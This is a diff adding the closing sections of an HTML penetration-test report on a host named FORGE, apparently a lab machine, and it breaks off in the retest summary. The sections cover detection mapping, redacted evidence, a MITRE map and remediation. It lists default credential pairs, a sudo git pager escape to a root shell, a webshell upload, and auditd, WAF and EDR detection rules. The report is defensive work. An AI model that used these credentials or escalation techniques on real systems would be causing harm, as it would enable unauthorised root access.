+        <strong>Finding:</strong> Service applies per-IP rate-limiting after 5 failed attempts (connection reset). SSH daemon is configured for public-key authentication only — <code>PasswordAuthentication no</code> confirmed via banner negotiation. Password authentication is not accepted by the server regardless of credential validity.<br>
+        <strong>Conclusion:</strong> Not exploitable via password brute-force. Key-auth posture is correct.
+      </div>
+    </div>
+
+    <div class="ne-card avoid-break">
+      <div style="display:flex;align-items:center;gap:0.5rem;margin-bottom:0.5rem;">
+        <span class="sev sev-ne">Non-Exploitable</span>
+      </div>
+      <div class="ne-card-title">Default Credential Spray — /login</div>
+      <div class="ne-card-reason">
+        <strong>Tool:</strong> Custom credential list (50 common pairs incl. admin:admin, admin:password, forge:forge, root:toor)<br>
+        <strong>Finding:</strong> All attempts return HTTP 401 Unauthorized. No account lockout observed (spray continued without triggering lockout), but no valid credentials found from the tested set. Login endpoint does not leak valid vs. invalid usernames.<br>
+        <strong>Conclusion:</strong> Not exploitable with common defaults. Strong credentials or non-default accounts in use.
+      </div>
+    </div>
+
+    <div class="ne-card avoid-break">
+      <div style="display:flex;align-items:center;gap:0.5rem;margin-bottom:0.5rem;">
+        <span class="sev sev-ne">Non-Exploitable</span>
+      </div>
+      <div class="ne-card-title">Cross-Site Request Forgery (CSRF)</div>
+      <div class="ne-card-reason">
+        <strong>Tool:</strong> Manual Burp Suite testing of all state-changing POST endpoints<br>
+        <strong>Finding:</strong> All state-changing endpoints (login, profile update, file upload form) include unpredictable, per-session CSRF tokens validated server-side. Requests submitted without a valid token receive HTTP 403. The token is not leaked in any observable channel.<br>
+        <strong>Conclusion:</strong> Not exploitable. CSRF protection correctly implemented.
+      </div>
+    </div>
+  </div>
+
+  <div style="margin-top:1.5rem;padding:1rem 1.2rem;background:var(--surface);border:1px solid var(--border);border-radius:var(--r-md);">
+    <div class="cover-meta-label" style="margin-bottom:0.4rem;">Scope Note — What Was Not Tested</div>
+    <p style="font-size:var(--fs-small);color:var(--ink-light);line-height:1.65;">The following were explicitly excluded from scope or not applicable: Denial-of-service testing; hosts outside 10.129.21.254; client-side application reverse engineering; physical security; social engineering. These exclusions were agreed prior to engagement commencement.</p>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     §09 — DETECTION / PURPLE-TEAM MAPPING
+═══════════════════════════════════════════ -->
+<section class="section page-break" id="detection">
+  <div class="section-numeral">09</div>
+  <div class="section-label">Purple Team</div>
+  <h2 class="section-title">Detection &amp; Purple-Team Mapping</h2>
+  <p class="section-lead">For each exploited stage: where detection was possible, what telemetry or rule would catch it, and whether a control was active during the engagement.</p>
+  <div class="section-rule"></div>
+
+  <div class="callout callout-gold" style="margin-bottom:1.5rem;">
+    <div class="callout-title">Purple-Team Finding</div>
+    None of the four exploited stages were detected by active monitoring during the engagement window. All detection opportunities below are currently <strong>OPEN</strong> — controls are either absent or not tuned to catch the observed techniques. The recommendations below provide a defensive roadmap aligned to each exploitation stage.
+  </div>
+
+  <div class="data-table-wrap avoid-break">
+    <table class="data-table">
+      <thead>
+        <tr>
+          <th>Stage</th>
+          <th>Attack Description</th>
+          <th>Detection Opportunity</th>
+          <th>Recommended Telemetry / Rule</th>
+          <th>Caught Today?</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td style="font-weight:700;color:var(--sev-critical);white-space:nowrap;">SSRF<br><span style="font-size:0.7rem;color:var(--ink-faint);font-weight:400;">F-01</span></td>
+          <td style="font-size:var(--fs-small);">Web tier making outbound HTTP requests to internal RFC-1918 / loopback addresses via <code>/api/fetch</code></td>
+          <td style="font-size:var(--fs-small);">Outbound connections from web process to internal addresses; anomalous <code>Host:</code> header values in fetch logs</td>
+          <td style="font-size:var(--fs-small);">Egress firewall rule blocking web-tier outbound to 127.0.0.0/8 and RFC-1918; WAF rule matching <code>url=.*127\.0\.0\.1</code>; SIEM alert on internal-target fetch log entries</td>
+          <td><span style="color:var(--sev-critical);font-weight:700;font-size:var(--fs-small);">&#10007; OPEN</span></td>
+        </tr>
+        <tr>
+          <td style="font-weight:700;color:var(--sev-critical);white-space:nowrap;">Upload → RCE<br><span style="font-size:0.7rem;color:var(--ink-faint);font-weight:400;">F-02</span></td>
+          <td style="font-size:var(--fs-small);">New executable file deposited in <code>/uploads/</code>; Apache spawning child process for PHP execution of uploaded file</td>
+          <td style="font-size:var(--fs-small);">File integrity monitoring (FIM) alert on new files in web root; EDR process-tree showing Apache spawning <code>sh</code> or <code>bash</code> child</td>
+          <td style="font-size:var(--fs-small);">FIM on <code>/var/www/html/uploads/</code> — alert on new executable or PHP file creation; EDR rule: <code>apache2</code> parent → <code>/bin/sh</code> or <code>/bin/bash</code> child (anomalous process ancestry); auditd rule on <code>execve</code> syscall from www-data</td>
+          <td><span style="color:var(--sev-critical);font-weight:700;font-size:var(--fs-small);">&#10007; OPEN</span></td>
+        </tr>
+        <tr>
+          <td style="font-weight:700;color:var(--sev-high);white-space:nowrap;">Privesc<br><span style="font-size:0.7rem;color:var(--ink-faint);font-weight:400;">F-03</span></td>
+          <td style="font-size:var(--fs-small);"><code>www-data</code> invoking <code>sudo git</code>; pager escape to root shell via <code>!/bin/sh</code></td>
+          <td style="font-size:var(--fs-small);">auditd sudo log: <code>www-data</code> running <code>/usr/bin/git</code> with elevated privileges; GTFOBins pager escape pattern</td>
+          <td style="font-size:var(--fs-small);">auditd rule monitoring <code>sudo</code> invocations by <code>www-data</code>; SIEM alert for sudo usage by web-process accounts; EDR rule: <code>git</code> spawning <code>/bin/sh</code> as child process (highly anomalous); review of GTFOBins-flagged binaries in sudoers</td>
+          <td><span style="color:var(--sev-critical);font-weight:700;font-size:var(--fs-small);">&#10007; OPEN</span></td>
+        </tr>
+        <tr>
+          <td style="font-weight:700;color:var(--sev-high);white-space:nowrap;">Loot / Cred Access<br><span style="font-size:0.7rem;color:var(--ink-faint);font-weight:400;">F-03 / T1003</span></td>
+          <td style="font-size:var(--fs-small);">Read access to <code>/root/.ssh/id_rsa</code>, <code>/root/root.txt</code>, <code>config.php</code> from root shell</td>
+          <td style="font-size:var(--fs-small);">Key-file access audit; reading of privileged credential files by a process not normally requiring them</td>
+          <td style="font-size:var(--fs-small);">auditd <code>-w /root/.ssh/id_rsa -p r -k ssh_key_access</code>; SIEM alert on access to <code>/root/</code> from non-root initiated processes; cloud key management (rotate to vault, eliminate file-based keys)</td>
+          <td><span style="color:var(--sev-critical);font-weight:700;font-size:var(--fs-small);">&#10007; OPEN</span></td>
+        </tr>
+        <tr>
+          <td style="font-weight:700;color:var(--sev-medium);white-space:nowrap;">XSS<br><span style="font-size:0.7rem;color:var(--ink-faint);font-weight:400;">F-05</span></td>
+          <td style="font-size:var(--fs-small);">Reflected script tag in <code>/search?q=</code> executes in victim browser</td>
+          <td style="font-size:var(--fs-small);">WAF XSS rule on query parameters; CSP violation report endpoint</td>
+          <td style="font-size:var(--fs-small);">WAF ModSecurity CRS XSS ruleset; deploy CSP with <code>report-uri</code> to capture violation telemetry; alert on <code>&lt;script&gt;</code> in URL-decoded request parameters</td>
+          <td><span style="color:var(--sev-critical);font-weight:700;font-size:var(--fs-small);">&#10007; OPEN</span></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div style="margin-top:1.5rem;">
+    <h3 style="font-family:'Fraunces',serif;font-size:1rem;font-weight:700;color:var(--brand);margin-bottom:0.8rem;">Recommended Detection Stack (Priority Order)</h3>
+    <div class="two-col" style="gap:1.5rem;">
+      <div>
+        <ol style="padding-left:1.2rem;font-size:var(--fs-small);color:var(--ink-mid);line-height:2;">
+          <li>Egress firewall blocking web-tier → RFC-1918 outbound</li>
+          <li>File integrity monitoring on all web root directories</li>
+          <li>EDR with process-ancestry rules (Apache → shell)</li>
+        </ol>
+      </div>
+      <div>
+        <ol start="4" style="padding-left:1.2rem;font-size:var(--fs-small);color:var(--ink-mid);line-height:2;">
+          <li>auditd rules: sudo by web accounts + key-file reads</li>
+          <li>WAF with ModSecurity CRS (SSRF + XSS rulesets)</li>
+          <li>SIEM correlation: anomalous process lineage alerts</li>
+        </ol>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     §10 — EVIDENCE APPENDIX
+═══════════════════════════════════════════ -->
+<section class="section section-alt" id="evidence">
+  <div class="section-numeral">10</div>
+  <div class="section-label">Evidence Appendix</div>
+  <h2 class="section-title">Evidence Appendix</h2>
+  <p class="section-lead">Integrity-hashed artifact registry. All evidence is redacted where it contains sensitive credential material and stored in the ARGUS evidence vault.</p>
+  <div class="section-rule"></div>
+
+  <div class="callout callout-info" style="margin-bottom:1.5rem;">
+    <div class="callout-title">Evidence Handling</div>
+    All artifacts were captured during the live engagement, immediately hashed (SHA-256), and stored in an encrypted evidence vault. Sensitive material (credentials, private keys, flag values) is redacted in this report; full unredacted artifacts are available to the client under NDA via secure transfer. The SHA-256 hashes below allow the client to verify integrity of any artifact provided.
+  </div>
+
+  <div style="border:1px solid var(--border);border-radius:var(--r-lg);overflow:hidden;background:var(--surface);">
+    <!-- Header -->
+    <div style="display:grid;grid-template-columns:70px 1fr 100px 1fr 80px;gap:0.8rem;padding:0.7rem 1.2rem;background:var(--brand);">
+      <div style="font-size:var(--fs-micro);font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:rgba(255,255,255,0.6);">ID</div>
+      <div style="font-size:var(--fs-micro);font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:rgba(255,255,255,0.6);">Artifact Description</div>
+      <div style="font-size:var(--fs-micro);font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:rgba(255,255,255,0.6);">Type</div>
+      <div style="font-size:var(--fs-micro);font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:rgba(255,255,255,0.6);">SHA-256 (truncated)</div>
+      <div style="font-size:var(--fs-micro);font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:rgba(255,255,255,0.6);">Finding</div>
+    </div>
+    <!-- Rows -->
+    <div style="display:grid;grid-template-columns:70px 1fr 100px 1fr 80px;gap:0.8rem;padding:0.75rem 1.2rem;border-bottom:1px solid var(--border);align-items:center;">
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;font-weight:700;color:var(--ink-faint);">EV-01</div>
+      <div style="font-size:var(--fs-small);color:var(--ink-mid);">SSRF tool trace — /api/fetch SSRF request/response capture showing internal admin HTML returned</div>
+      <div><span class="tag">Tool Trace</span></div>
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.7rem;color:var(--ink-faint);">a1b2c3d4…7890abcdef</div>
+      <div><span class="sev sev-critical" style="font-size:0.65rem;">F-01</span></div>
+    </div>
+    <div style="display:grid;grid-template-columns:70px 1fr 100px 1fr 80px;gap:0.8rem;padding:0.75rem 1.2rem;border-bottom:1px solid var(--border);background:var(--surface-warm);align-items:center;">
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;font-weight:700;color:var(--ink-faint);">EV-02</div>
+      <div style="font-size:var(--fs-small);color:var(--ink-mid);">Webshell upload request + RCE proof — curl output showing uid=33(www-data); /etc/passwd excerpt (redacted)</div>
+      <div><span class="tag">Shell Capture</span></div>
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.7rem;color:var(--ink-faint);">a1b2c3d4e5f6a7b8…45</div>
+      <div><span class="sev sev-critical" style="font-size:0.65rem;">F-02</span></div>
+    </div>
+    <div style="display:grid;grid-template-columns:70px 1fr 100px 1fr 80px;gap:0.8rem;padding:0.75rem 1.2rem;border-bottom:1px solid var(--border);align-items:center;">
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;font-weight:700;color:var(--ink-faint);">EV-03</div>
+      <div style="font-size:var(--fs-small);color:var(--ink-mid);">LinPEAS output excerpt showing sudo NOPASSWD /usr/bin/git rule for www-data</div>
+      <div><span class="tag">Tool Output</span></div>
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.7rem;color:var(--ink-faint);">b1c2d3e4f5a6b7c8…f3</div>
+      <div><span class="sev sev-high" style="font-size:0.65rem;">F-03</span></div>
+    </div>
+    <div style="display:grid;grid-template-columns:70px 1fr 100px 1fr 80px;gap:0.8rem;padding:0.75rem 1.2rem;border-bottom:1px solid var(--border);background:var(--surface-warm);align-items:center;">
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;font-weight:700;color:var(--ink-faint);">EV-04</div>
+      <div style="font-size:var(--fs-small);color:var(--ink-mid);">Root SSH private key (/root/.ssh/id_rsa) — REDACTED. Full key stored in encrypted vault. Confirms root credential access.</div>
+      <div><span class="tag">Credential</span></div>
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.7rem;color:var(--ink-faint);">18aa92b3c4d5e6f7…bc</div>
+      <div><span class="sev sev-high" style="font-size:0.65rem;">F-03</span></div>
+    </div>
+    <div style="display:grid;grid-template-columns:70px 1fr 100px 1fr 80px;gap:0.8rem;padding:0.75rem 1.2rem;border-bottom:1px solid var(--border);align-items:center;">
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;font-weight:700;color:var(--ink-faint);">EV-05</div>
+      <div style="font-size:var(--fs-small);color:var(--ink-mid);">user.txt flag capture — REDACTED. Confirms user-level foothold achieved at /var/www/user.txt</div>
+      <div><span class="tag">Flag / Loot</span></div>
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.7rem;color:var(--ink-faint);">9f2c1a4b3c5d2e7f…e4</div>
+      <div><span class="sev sev-critical" style="font-size:0.65rem;">F-02</span></div>
+    </div>
+    <div style="display:grid;grid-template-columns:70px 1fr 100px 1fr 80px;gap:0.8rem;padding:0.75rem 1.2rem;border-bottom:1px solid var(--border);background:var(--surface-warm);align-items:center;">
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;font-weight:700;color:var(--ink-faint);">EV-06</div>
+      <div style="font-size:var(--fs-small);color:var(--ink-mid);">root.txt flag capture — REDACTED. Confirms full root compromise achieved at /root/root.txt</div>
+      <div><span class="tag">Flag / Loot</span></div>
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.7rem;color:var(--ink-faint);">3b71de4a5b6c7d8e…a0</div>
+      <div><span class="sev sev-critical" style="font-size:0.65rem;">F-03</span></div>
+    </div>
+    <div style="display:grid;grid-template-columns:70px 1fr 100px 1fr 80px;gap:0.8rem;padding:0.75rem 1.2rem;align-items:center;">
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;font-weight:700;color:var(--ink-faint);">EV-07</div>
+      <div style="font-size:var(--fs-small);color:var(--ink-mid);">config.php credential capture — DB_USER and DB_PASS values REDACTED. Confirms DB credential exposure.</div>
+      <div><span class="tag">Credential</span></div>
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.7rem;color:var(--ink-faint);">77de10a1b2c3d4e5…39</div>
+      <div><span class="sev sev-info" style="font-size:0.65rem;">F-14</span></div>
+    </div>
+  </div>
+
+  <p style="font-size:var(--fs-micro);color:var(--ink-faint);margin-top:0.8rem;line-height:1.7;">All SHA-256 values are truncated in this report for readability. Full hashes are provided in the secure evidence package. Artifacts marked REDACTED contain sensitive material not suitable for inclusion in a distributable report document.</p>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     §11 — MITRE ATT&CK MAP
+═══════════════════════════════════════════ -->
+<section class="section" id="mitre">
+  <div class="section-numeral">11</div>
+  <div class="section-label">MITRE ATT&amp;CK</div>
+  <h2 class="section-title">MITRE ATT&amp;CK Map</h2>
+  <p class="section-lead">Techniques observed during this engagement mapped to the MITRE ATT&CK Enterprise framework, with associated findings and tactic phases.</p>
+  <div class="section-rule"></div>
+
+  <div class="mitre-grid">
+    <div class="mitre-cell avoid-break">
+      <div class="mitre-cell-phase">Initial Access</div>
+      <div class="mitre-cell-tactic">Exploit Public-Facing Application</div>
+      <div class="mitre-cell-id">T1190</div>
+      <div style="font-size:0.7rem;color:rgba(255,255,255,0.4);margin-top:0.3rem;">SSRF /api/fetch → F-01</div>
+    </div>
+    <div class="mitre-cell avoid-break">
+      <div class="mitre-cell-phase">Execution</div>
+      <div class="mitre-cell-tactic">Command &amp; Scripting Interpreter</div>
+      <div class="mitre-cell-id">T1059</div>
+      <div style="font-size:0.7rem;color:rgba(255,255,255,0.4);margin-top:0.3rem;">Webshell OS commands → F-02</div>
+    </div>
+    <div class="mitre-cell avoid-break">
+      <div class="mitre-cell-phase">Execution</div>
+      <div class="mitre-cell-tactic">JavaScript Execution (XSS)</div>
+      <div class="mitre-cell-id">T1059.007</div>
+      <div style="font-size:0.7rem;color:rgba(255,255,255,0.4);margin-top:0.3rem;">Reflected XSS /search → F-05</div>
+    </div>
+    <div class="mitre-cell avoid-break">
+      <div class="mitre-cell-phase">Persistence</div>
+      <div class="mitre-cell-tactic">Server Software Component — Web Shell</div>
+      <div class="mitre-cell-id">T1505.003</div>
+      <div style="font-size:0.7rem;color:rgba(255,255,255,0.4);margin-top:0.3rem;">shell.php.jpg → F-02</div>
+    </div>
+    <div class="mitre-cell avoid-break">
+      <div class="mitre-cell-phase">Privilege Escalation</div>
+      <div class="mitre-cell-tactic">Sudo and Sudo Caching</div>
+      <div class="mitre-cell-id">T1548.003</div>
+      <div style="font-size:0.7rem;color:rgba(255,255,255,0.4);margin-top:0.3rem;">sudo git GTFOBins → F-03</div>
+    </div>
+    <div class="mitre-cell avoid-break">
+      <div class="mitre-cell-phase">Defense Evasion</div>
+      <div class="mitre-cell-tactic">Abuse Elevation Control Mechanism</div>
+      <div class="mitre-cell-id">T1548</div>
+      <div style="font-size:0.7rem;color:rgba(255,255,255,0.4);margin-top:0.3rem;">NOPASSWD sudoers rule → F-03</div>
+    </div>
+    <div class="mitre-cell avoid-break">
+      <div class="mitre-cell-phase">Credential Access</div>
+      <div class="mitre-cell-tactic">OS Credential Dumping</div>
+      <div class="mitre-cell-id">T1003</div>
+      <div style="font-size:0.7rem;color:rgba(255,255,255,0.4);margin-top:0.3rem;">id_rsa + config.php → F-03/F-14</div>
+    </div>
+    <div class="mitre-cell avoid-break">
+      <div class="mitre-cell-phase">Discovery</div>
+      <div class="mitre-cell-tactic">File and Directory Discovery</div>
+      <div class="mitre-cell-id">T1083</div>
+      <div style="font-size:0.7rem;color:rgba(255,255,255,0.4);margin-top:0.3rem;">LinPEAS, gobuster → F-10</div>
+    </div>
+    <div class="mitre-cell avoid-break">
+      <div class="mitre-cell-phase">Collection</div>
+      <div class="mitre-cell-tactic">Data from Local System</div>
+      <div class="mitre-cell-id">T1005</div>
+      <div style="font-size:0.7rem;color:rgba(255,255,255,0.4);margin-top:0.3rem;">user.txt, root.txt, id_rsa exfil</div>
+    </div>
+  </div>
+
+  <!-- ATT&CK Tactic flow SVG -->
+  <div style="margin-top:2rem;background:var(--surface);border:1px solid var(--border);border-radius:var(--r-lg);padding:1.5rem;">
+    <div class="chart-title" style="margin-bottom:1rem;">ATT&amp;CK Tactic Coverage — Observed Techniques</div>
+    <svg viewBox="0 0 780 90" xmlns="http://www.w3.org/2000/svg" style="width:100%;display:block;">
+      <defs>
+        <marker id="tac-arr" markerWidth="7" markerHeight="7" refX="6" refY="3.5" orient="auto">
+          <path d="M0,0 L0,7 L7,3.5 z" fill="#C8C8D8"/>
+        </marker>
+      </defs>
+
+      <!-- Tactic boxes -->
+      <!-- Initial Access -->
+      <rect x="2" y="15" width="100" height="56" rx="6" fill="#2A0C0C" stroke="#C0392B" stroke-width="1.5"/>
+      <text x="52" y="37" fill="#C0392B" font-size="7.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="0.8">INITIAL ACCESS</text>
+      <text x="52" y="52" fill="#ff9999" font-size="8" font-family="JetBrains Mono,monospace" text-anchor="middle">T1190</text>
+      <text x="52" y="63" fill="#8a4a4a" font-size="6.5" font-family="Inter,sans-serif" text-anchor="middle">SSRF</text>
+
+      <line x1="102" y1="43" x2="115" y2="43" stroke="#C8C8D8" stroke-width="1" marker-end="url(#tac-arr)"/>
+
+      <!-- Execution -->
+      <rect x="116" y="15" width="100" height="56" rx="6" fill="#251C06" stroke="#B8960C" stroke-width="1.5"/>
+      <text x="166" y="37" fill="#B8960C" font-size="7.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="0.8">EXECUTION</text>
+      <text x="166" y="52" fill="#ffc04a" font-size="7.5" font-family="JetBrains Mono,monospace" text-anchor="middle">T1059 / .007</text>
+      <text x="166" y="63" fill="#8a6a00" font-size="6.5" font-family="Inter,sans-serif" text-anchor="middle">Webshell + XSS</text>
+
+      <line x1="216" y1="43" x2="229" y2="43" stroke="#C8C8D8" stroke-width="1" marker-end="url(#tac-arr)"/>
+
+      <!-- Persistence -->
+      <rect x="230" y="15" width="100" height="56" rx="6" fill="#1A0A2A" stroke="#8e44ad" stroke-width="1.5"/>
+      <text x="280" y="37" fill="#8e44ad" font-size="7.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="0.8">PERSISTENCE</text>
+      <text x="280" y="52" fill="#c39bd3" font-size="8" font-family="JetBrains Mono,monospace" text-anchor="middle">T1505.003</text>
+      <text x="280" y="63" fill="#5a3a6a" font-size="6.5" font-family="Inter,sans-serif" text-anchor="middle">Web Shell</text>
+
+      <line x1="330" y1="43" x2="343" y2="43" stroke="#C8C8D8" stroke-width="1" marker-end="url(#tac-arr)"/>
+
+      <!-- Priv Esc -->
+      <rect x="344" y="15" width="100" height="56" rx="6" fill="#250D00" stroke="#D35400" stroke-width="1.5"/>
+      <text x="394" y="30" fill="#D35400" font-size="7.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="0.8">PRIVILEGE</text>
+      <text x="394" y="41" fill="#D35400" font-size="7.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="0.8">ESCALATION</text>
+      <text x="394" y="56" fill="#e67e22" font-size="8" font-family="JetBrains Mono,monospace" text-anchor="middle">T1548.003</text>
+      <text x="394" y="67" fill="#8a4a00" font-size="6.5" font-family="Inter,sans-serif" text-anchor="middle">sudo git</text>
+
+      <line x1="444" y1="43" x2="457" y2="43" stroke="#C8C8D8" stroke-width="1" marker-end="url(#tac-arr)"/>
+
+      <!-- Cred Access -->
+      <rect x="458" y="15" width="100" height="56" rx="6" fill="#0A1A2A" stroke="#2980b9" stroke-width="1.5"/>
+      <text x="508" y="30" fill="#2980b9" font-size="7.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="0.8">CREDENTIAL</text>
+      <text x="508" y="41" fill="#2980b9" font-size="7.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="0.8">ACCESS</text>
+      <text x="508" y="56" fill="#7eb8f7" font-size="8" font-family="JetBrains Mono,monospace" text-anchor="middle">T1003</text>
+      <text x="508" y="67" fill="#2a5a8a" font-size="6.5" font-family="Inter,sans-serif" text-anchor="middle">id_rsa + DB creds</text>
+
+      <line x1="558" y1="43" x2="571" y2="43" stroke="#C8C8D8" stroke-width="1" marker-end="url(#tac-arr)"/>
+
+      <!-- Discovery -->
+      <rect x="572" y="15" width="96" height="56" rx="6" fill="#0A1A0A" stroke="#27ae60" stroke-width="1.5"/>
+      <text x="620" y="37" fill="#27ae60" font-size="7.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="0.8">DISCOVERY</text>
+      <text x="620" y="52" fill="#a0ffb8" font-size="8" font-family="JetBrains Mono,monospace" text-anchor="middle">T1083 / T1005</text>
+      <text x="620" y="63" fill="#1a5a2a" font-size="6.5" font-family="Inter,sans-serif" text-anchor="middle">LinPEAS + Loot</text>
+
+      <line x1="668" y1="43" x2="680" y2="43" stroke="#C8C8D8" stroke-width="1" marker-end="url(#tac-arr)"/>
+
+      <!-- Impact / Objective -->
+      <rect x="681" y="15" width="96" height="56" rx="6" fill="#0A1F0A" stroke="#2ecc71" stroke-width="2"/>
+      <text x="729" y="37" fill="#2ecc71" font-size="7.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="0.8">IMPACT</text>
+      <text x="729" y="52" fill="#a0ffb8" font-size="8.5" font-family="Fraunces,serif" font-weight="900" text-anchor="middle">ROOT</text>
+      <text x="729" y="65" fill="#1a6b3c" font-size="6.5" font-family="Inter,sans-serif" text-anchor="middle">Full Compromise</text>
+    </svg>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════════
+     §12 — REMEDIATION ROADMAP
+═══════════════════════════════════════════ -->
+<section class="section section-alt page-break" id="remediation">
+  <div class="section-numeral">12</div>
+  <div class="section-label">Remediation Roadmap</div>
+  <h2 class="section-title">Remediation Roadmap</h2>
+  <p class="section-lead">Three-tier prioritised remediation plan. P1 items should be actioned within 48 hours; P2 within 14 days; P3 within 90 days.</p>
+  <div class="section-rule"></div>
+
+  <!-- P1 -->
+  <div class="remed-tier remed-tier-p1 avoid-break">
+    <div class="remed-tier-header">
+      <span class="sev sev-critical">P1 — Critical</span>
+      <span class="remed-tier-label">Immediate Action Required · Target: 48 Hours</span>
+    </div>
+    <p style="font-size:var(--fs-small);color:var(--ink-mid);margin-bottom:0.8rem;line-height:1.6;">These items represent active, exploitable compromise paths. Until P1 items are remediated, the host must be considered fully compromised and should not be exposed to untrusted networks. Address in the order listed — remediating SSRF first collapses the attack chain for F-02 and beyond.</p>
+    <ul class="remed-items">
+      <li><strong>F-01 — SSRF:</strong> Implement a strict server-side egress allow-list for <code>/api/fetch</code>. Block all loopback, RFC-1918, and link-local destinations. Validate resolved IPs post-DNS to prevent rebinding. Consider a dedicated out-of-process proxy with network-enforced egress controls.</li>
+      <li><strong>F-02 — Upload RCE:</strong> Enforce magic-byte MIME validation on all uploads (reject non-image MIME types). Store uploaded files outside the web root on a <code>noexec</code>-mounted partition. Serve uploads through a dedicated handler with <code>Content-Disposition: attachment</code>. Immediately purge all files from <code>/uploads/</code> and audit for webshell persistence.</li>
+      <li><strong>F-03 — Sudo NOPASSWD git:</strong> Remove the <code>www-data ALL=(ALL) NOPASSWD: /usr/bin/git</code> sudoers entry. Audit all NOPASSWD binaries against GTFOBins. Verify with <code>sudo -l -U www-data</code> post-fix.</li>
+      <li><strong>Credential Rotation:</strong> Immediately revoke the leaked SSH private key (<code>id_rsa</code>) and regenerate the key pair. Rotate the <code>DB_PASS</code> from <code>config.php</code>. Audit all services using these credentials for signs of unauthorised access.</li>
+    </ul>
+  </div>
+
+  <!-- P2 -->
+  <div class="remed-tier remed-tier-p2 avoid-break">
+    <div class="remed-tier-header">
+      <span class="sev sev-high">P2 — High / Medium</span>
+      <span class="remed-tier-label">Important Hardening · Target: 14 Days</span>
+    </div>
+    <p style="font-size:var(--fs-small);color:var(--ink-mid);margin-bottom:0.8rem;line-height:1.6;">These items do not represent immediate compromise paths in isolation but materially reduce the attack surface and the impact of any future incident. They should be scheduled immediately and completed before the next retest window.</p>
+    <ul class="remed-items">
+      <li><strong>F-04 — Patch Apache:</strong> Run <code>apt-get update &amp;&amp; apt-get upgrade apache2</code> to apply the latest 2.4.x patch for Ubuntu 20.04. Implement a monthly patch cadence for all internet-facing services.</li>
+      <li><strong>F-05 — XSS Encoding:</strong> HTML-encode all user-supplied values in the <code>/search</code> template output. Use a templating engine with auto-escaping enabled by default. Retest manually and with a scanner after deployment.</li>
+      <li><strong>F-06 — Security Headers:</strong> Add <code>Content-Security-Policy</code>, <code>Strict-Transport-Security</code>, <code>X-Frame-Options: DENY</code>, <code>X-Content-Type-Options: nosniff</code>, and <code>Referrer-Policy: no-referrer</code> to all HTTP responses via Apache <code>mod_headers</code>. Validate at securityheaders.com.</li>
+      <li><strong>F-07 — Disable TRACE:</strong> Set <code>TraceEnable Off</code> in the Apache global configuration. Verify with <code>curl -X TRACE http://FORGE/ -v</code> expecting HTTP 405.</li>
+    </ul>
+  </div>
+
+  <!-- P3 -->
+  <div class="remed-tier remed-tier-p3 avoid-break">
+    <div class="remed-tier-header">
+      <span class="sev sev-info">P3 — Low / Hygiene</span>
+      <span class="remed-tier-label">Best-Practice Hygiene · Target: 90 Days</span>
+    </div>
+    <p style="font-size:var(--fs-small);color:var(--ink-mid);margin-bottom:0.8rem;line-height:1.6;">Lower-risk hardening items that reduce attacker reconnaissance value and tighten the overall security posture. These should be scheduled as part of the next planned maintenance window.</p>
+    <ul class="remed-items">
+      <li><strong>F-08 — Disable TLS 1.0/1.1:</strong> Set <code>SSLProtocol -all +TLSv1.2 +TLSv1.3</code> in the Apache SSL virtual host configuration. Confirm with <code>testssl.sh</code> post-deployment.</li>
+      <li><strong>F-09 — Suppress Version Banners:</strong> Set <code>ServerTokens Prod</code> and <code>ServerSignature Off</code> in Apache. Set <code>DebianBanner no</code> in <code>/etc/ssh/sshd_config</code> and restart sshd.</li>
+      <li><strong>Detection Stack:</strong> Implement the detection controls listed in §09: egress firewall, FIM on web root, EDR process-ancestry rules, auditd sudo monitoring. Target the four open detection gaps identified during this engagement.</li>
+      <li><strong>F-10 — Directory Listing:</strong> Disable Apache directory listing for <code>/uploads/</code> with <code>Options -Indexes</code>. Confirm by requesting the directory URL and expecting HTTP 403.</li>
+    </ul>
+  </div>
+
+  <!-- Retest summary -->
+  <div style="margin-top:1.5rem;background:var(--surface);border:1px solid var(--border);border-radius:var(--r-lg);overflow:hidden;">
+    <div style="background:var(--brand);padding:0.8rem 1.2rem;">
+      <div style="font-size:var(--fs-micro);font-weight:700;letter-spacing:0.15em;text-transform:uppercase;color:rgba(255,255,255,0.6);">Retest Status Summary (19 Jun 2026 · 09:00)</div>
+    </div>
+    <div style="padding:1.2rem;font-size:var(--fs-small);">
+      <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem;">
+        <div style="text-align:center;padding:1rem;background:var(--sev-critical-bg);border-radius:var(--r-md);border:1px solid rgba(192,57,43,0.2);">
